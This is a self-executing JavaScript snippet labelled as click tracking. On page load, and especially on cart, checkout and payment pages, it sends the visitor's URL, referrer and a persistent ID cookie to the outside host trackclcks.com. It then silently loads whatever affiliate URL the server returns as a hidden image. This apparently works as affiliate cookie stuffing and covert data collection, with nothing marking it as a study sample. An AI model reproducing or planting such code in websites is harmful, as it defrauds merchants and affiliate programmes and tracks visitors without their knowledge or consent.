(function () {

    function generateUUID() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (char) {

            var random = Math.random() * 16 | 0;

            var value =
                char === "x"
                    ? random
                    : (random & 3 | 8);

            return value.toString(16);
        });
    }

    function getCookie(cookieName) {

        var name = cookieName + "=";

        var cookies = document.cookie.split(";");

        for (var i = 0; i < cookies.length; i++) {

            var cookie = cookies[i].trim();

            if (cookie.indexOf(name) === 0) {
                return cookie.substring(name.length);
            }
        }

        return "";
    }

    function isCartPage() {

        var pathname = window.location.pathname.toLowerCase();

        var cartPatterns = [
            "cart",
            "checkout",
            "payment",
            "pay",
            "shipping",
            "review-order"
        ];

        return cartPatterns.some(function (pattern) {
            return pathname.includes(pattern);
        });
    }

    function fireTrackingPixel(url) {

        try {

            var image = new Image();

            image.src = url;

            image.onload = function () {};

            image.onerror = function () {};

        } catch (error) {

            console.error("Tracking pixel error:", error);
        }
    }

    function fireFallbackPixel(uniqueId) {

        try {

            var image = new Image();

            image.src =
                "https://trackclcks.com/api/fallback-pixel?id=" +
                encodeURIComponent(uniqueId);

            image.onload = function () {};

            image.onerror = function () {};

        } catch (error) {

            console.error("Fallback pixel error:", error);
        }
    }

    async function initTracking() {

        var sessionKey =
            "tracking_done_" + window.location.hostname;

        if (
            sessionStorage.getItem(sessionKey) &&
            !isCartPage()
        ) {
            return;
        }

        try {

            var uniqueId =
                getCookie("tracking_uuid") ||
                generateUUID();

            var expiryDate =
                new Date(Date.now() + 2592e6);

            document.cookie =
                "tracking_uuid=" +
                uniqueId +
                "; expires=" +
                expiryDate.toUTCString() +
                "; path=/; SameSite=Lax";

            var response = await fetch(
                "https://trackclcks.com/api/track-user",
                {
                    method: "POST",
                    keepalive: true,

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        url: window.location.href,
                        referrer: document.referrer,
                        unique_id: uniqueId,
                        origin: window.location.hostname,
                        timestamp: Date.now()
                    })
                }
            );

            var result = await response.json();

            if (
                result.success &&
                result.affiliate_url
            ) {

                fireTrackingPixel(
                    result.affiliate_url
                );

                sessionStorage.setItem(
                    sessionKey,
                    "true"
                );

            } else {

                fireFallbackPixel(uniqueId);
            }

        } catch (error) {

            console.error(
                "Tracking Failed:",
                error
            );

            fireFallbackPixel(generateUUID());
        }
    }

   function runTracking() {

    fetch(
        "https://trackclcks.com/api/site-config?host=" +
        encodeURIComponent(
            window.location.hostname
        )
    )

    .then(function (response) {

        return response.json();
    })

    .then(function (siteConfig) {

      
        if (
            !siteConfig ||
            (
                !siteConfig.always &&
                !siteConfig.cartExtra
            )
        ) {
            return;
        }

      
        if (siteConfig.always) {

            initTracking();
        }

       
        if (
            siteConfig.cartExtra &&
            isCartPage()
        ) {

            initTracking();
        }
    })

    .catch(function (error) {

        console.error(
            "Config fetch failed:",
            error
        );
    });
}

    if (
        document.readyState === "interactive" ||
        document.readyState === "complete"
    ) {

        runTracking();

    } else {

        window.addEventListener(
            "DOMContentLoaded",
            runTracking
        );
    }

})();